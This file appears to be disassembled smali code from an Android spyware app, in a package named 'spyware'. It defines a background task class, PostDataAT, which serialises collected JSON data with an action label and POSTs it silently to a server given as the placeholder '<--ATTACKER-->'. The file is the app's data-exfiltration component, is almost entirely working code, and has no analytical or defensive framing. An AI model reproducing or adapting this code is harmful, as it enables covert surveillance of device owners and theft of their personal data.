.class public Landroid/spyware/PostDataAT;
.super Landroid/os/AsyncTask;
.source "PostDataAT.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Landroid/spyware/Param;",
        "Ljava/lang/Void;",
        "Ljava/lang/Integer;",
        ">;"
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 53
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected varargs doInBackground([Landroid/spyware/Param;)Ljava/lang/Integer;
    .registers 16
    .param p1, "params"    # [Landroid/spyware/Param;

    .prologue
    .line 57
    const/4 v2, 0x0

    .line 58
    .local v2, "con":Ljava/net/HttpURLConnection;
    const/4 v5, 0x0

    .line 61
    .local v5, "out":Ljava/io/DataOutputStream;
    const/4 v10, 0x0

    :try_start_3
    aget-object v10, p1, v10

    invoke-virtual {v10}, Landroid/spyware/Param;->getAction()Ljava/lang/String;

    move-result-object v1

    .line 64
    .local v1, "action":Ljava/lang/String;
    const/4 v10, 0x0

    aget-object v10, p1, v10

    invoke-virtual {v10}, Landroid/spyware/Param;->isJArray()Z

    move-result v10

    if-eqz v10, :cond_e1

    .line 65
    const/4 v10, 0x0

    aget-object v10, p1, v10

    invoke-virtual {v10}, Landroid/spyware/Param;->getJArray()Lorg/json/JSONArray;

    move-result-object v10

    invoke-virtual {v10}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v3

    .line 69
    .local v3, "data":Ljava/lang/String;
    :goto_1d
    new-instance v9, Ljava/net/URL;

    const-string v10, "<--ATTACKER-->"

    invoke-direct {v9, v10}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 70
    .local v9, "url":Ljava/net/URL;
    new-instance v10, Landroid/net/Uri$Builder;

    invoke-direct {v10}, Landroid/net/Uri$Builder;-><init>()V

    const-string v11, "action"

    .line 71
    invoke-virtual {v10, v11, v1}, Landroid/net/Uri$Builder;->appendQueryParameter(Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri$Builder;

    move-result-object v10

    const-string v11, "data"

    .line 72
    invoke-virtual {v10, v11, v3}, Landroid/net/Uri$Builder;->appendQueryParameter(Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri$Builder;

    move-result-object v10

    .line 73
    invoke-virtual {v10}, Landroid/net/Uri$Builder;->build()Landroid/net/Uri;

    move-result-object v10

    invoke-virtual {v10}, Landroid/net/Uri;->getEncodedQuery()Ljava/lang/String;

    move-result-object v7

    .line 75
    .local v7, "request":Ljava/lang/String;
    invoke-virtual {v9}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v10

    move-object v0, v10

    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v2, v0

    .line 76
    const/4 v10, 0x1

    invoke-virtual {v2, v10}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 77
    const/4 v10, 0x1

    invoke-virtual {v2, v10}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 80
    const-string v10, "POST"

    invoke-virtual {v2, v10}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 81
    const-string v10, "Content-Type"

    const-string v11, "application/x-www-form-urlencoded;charset=utf-8"

    invoke-virtual {v2, v10, v11}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 82
    const-string v10, "X-Requested-With"

    const-string v11, "XMLHttpRequest"

    invoke-virtual {v2, v10, v11}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 83
    invoke-virtual {v7}, Ljava/lang/String;->getBytes()[B

    move-result-object v10

    array-length v10, v10

    invoke-virtual {v2, v10}, Ljava/net/HttpURLConnection;->setFixedLengthStreamingMode(I)V

    .line 85
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->connect()V

    .line 88
    new-instance v6, Ljava/io/DataOutputStream;

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v10

    invoke-direct {v6, v10}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
    :try_end_74
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_74} :catch_10c
    .catchall {:try_start_3 .. :try_end_74} :catchall_153

    .line 89
    .end local v5    # "out":Ljava/io/DataOutputStream;
    .local v6, "out":Ljava/io/DataOutputStream;
    :try_start_74
    invoke-virtual {v6, v7}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 90
    invoke-virtual {v6}, Ljava/io/DataOutputStream;->flush()V

    .line 93
    const-string v10, "::trace"

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "::DEB  Post data:"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v10, v11}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 96
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v11

    invoke-static {v11}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, " | "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseMessage()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 99
    .local v8, "responseCode":Ljava/lang/String;
    const-string v10, "::trace"

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "::DEB  Response code: "

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v10, v11}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 101
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v10

    invoke-static {v10}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;
    :try_end_d4
    .catch Ljava/io/IOException; {:try_start_74 .. :try_end_d4} :catch_180
    .catchall {:try_start_74 .. :try_end_d4} :catchall_17d

    move-result-object v10

    .line 106
    if-eqz v2, :cond_da

    .line 107
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 108
    :cond_da
    if-eqz v6, :cond_df

    .line 110
    :try_start_dc
    invoke-virtual {v6}, Ljava/io/DataOutputStream;->close()V
    :try_end_df
    .catch Ljava/io/IOException; {:try_start_dc .. :try_end_df} :catch_ee

    :cond_df
    :goto_df
    move-object v5, v6

    .line 116
    .end local v1    # "action":Ljava/lang/String;
    .end local v3    # "data":Ljava/lang/String;
    .end local v6    # "out":Ljava/io/DataOutputStream;
    .end local v7    # "request":Ljava/lang/String;
    .end local v8    # "responseCode":Ljava/lang/String;
    .end local v9    # "url":Ljava/net/URL;
    .restart local v5    # "out":Ljava/io/DataOutputStream;
    :goto_e0
    return-object v10

    .line 67
    .restart local v1    # "action":Ljava/lang/String;
    :cond_e1
    const/4 v10, 0x0

    :try_start_e2
    aget-object v10, p1, v10

    invoke-virtual {v10}, Landroid/spyware/Param;->getJObject()Lorg/json/JSONObject;

    move-result-object v10

    invoke-virtual {v10}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
    :try_end_eb
    .catch Ljava/io/IOException; {:try_start_e2 .. :try_end_eb} :catch_10c
    .catchall {:try_start_e2 .. :try_end_eb} :catchall_153

    move-result-object v3

    .restart local v3    # "data":Ljava/lang/String;
    goto/16 :goto_1d

    .line 111
    .end local v5    # "out":Ljava/io/DataOutputStream;
    .restart local v6    # "out":Ljava/io/DataOutputStream;
    .restart local v7    # "request":Ljava/lang/String;
    .restart local v8    # "responseCode":Ljava/lang/String;
    .restart local v9    # "url":Ljava/net/URL;
    :catch_ee
    move-exception v4

    .line 112
    .local v4, "e":Ljava/io/IOException;
    const-string v11, "::trace"

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "::ERR  "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-static {v4}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v11, v12}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_df

    .line 102
    .end local v1    # "action":Ljava/lang/String;
    .end local v3    # "data":Ljava/lang/String;
    .end local v4    # "e":Ljava/io/IOException;
    .end local v6    # "out":Ljava/io/DataOutputStream;
    .end local v7    # "request":Ljava/lang/String;
    .end local v8    # "responseCode":Ljava/lang/String;
    .end local v9    # "url":Ljava/net/URL;
    .restart local v5    # "out":Ljava/io/DataOutputStream;
    :catch_10c
    move-exception v4

    .line 104
    .restart local v4    # "e":Ljava/io/IOException;
    :goto_10d
    :try_start_10d
    const-string v10, "::trace"

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "::ERR  "

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-static {v4}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v10, v11}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_129
    .catchall {:try_start_10d .. :try_end_129} :catchall_153

    .line 106
    if-eqz v2, :cond_12e

    .line 107
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 108
    :cond_12e
    if-eqz v5, :cond_133

    .line 110
    :try_start_130
    invoke-virtual {v5}, Ljava/io/DataOutputStream;->close()V
    :try_end_133
    .catch Ljava/io/IOException; {:try_start_130 .. :try_end_133} :catch_135

    .line 116
    :cond_133
    :goto_133
    const/4 v10, 0x0

    goto :goto_e0

    .line 111
    :catch_135
    move-exception v4

    .line 112
    const-string v10, "::trace"

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "::ERR  "

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-static {v4}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v10, v11}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_133

    .line 106
    .end local v4    # "e":Ljava/io/IOException;
    :catchall_153
    move-exception v10

    :goto_154
    if-eqz v2, :cond_159

    .line 107
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 108
    :cond_159
    if-eqz v5, :cond_15e

    .line 110
    :try_start_15b
    invoke-virtual {v5}, Ljava/io/DataOutputStream;->close()V
    :try_end_15e
    .catch Ljava/io/IOException; {:try_start_15b .. :try_end_15e} :catch_15f

    .line 113
    :cond_15e
    :goto_15e
    throw v10

    .line 111
    :catch_15f
    move-exception v4

    .line 112
    .restart local v4    # "e":Ljava/io/IOException;
    const-string v11, "::trace"

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "::ERR  "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-static {v4}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v11, v12}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_15e

    .line 106
    .end local v4    # "e":Ljava/io/IOException;
    .end local v5    # "out":Ljava/io/DataOutputStream;
    .restart local v1    # "action":Ljava/lang/String;
    .restart local v3    # "data":Ljava/lang/String;
    .restart local v6    # "out":Ljava/io/DataOutputStream;
    .restart local v7    # "request":Ljava/lang/String;
    .restart local v9    # "url":Ljava/net/URL;
    :catchall_17d
    move-exception v10

    move-object v5, v6

    .end local v6    # "out":Ljava/io/DataOutputStream;
    .restart local v5    # "out":Ljava/io/DataOutputStream;
    goto :goto_154

    .line 102
    .end local v5    # "out":Ljava/io/DataOutputStream;
    .restart local v6    # "out":Ljava/io/DataOutputStream;
    :catch_180
    move-exception v4

    move-object v5, v6

    .end local v6    # "out":Ljava/io/DataOutputStream;
    .restart local v5    # "out":Ljava/io/DataOutputStream;
    goto :goto_10d
.end method

.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .registers 3

    .prologue
    .line 53
    check-cast p1, [Landroid/spyware/Param;

    invoke-virtual {p0, p1}, Landroid/spyware/PostDataAT;->doInBackground([Landroid/spyware/Param;)Ljava/lang/Integer;

    move-result-object v0

    return-object v0
.end method

.method protected onPostExecute(I)I
    .registers 2
    .param p1, "responseCode"    # I

    .prologue
    .line 120
    return p1
.end method
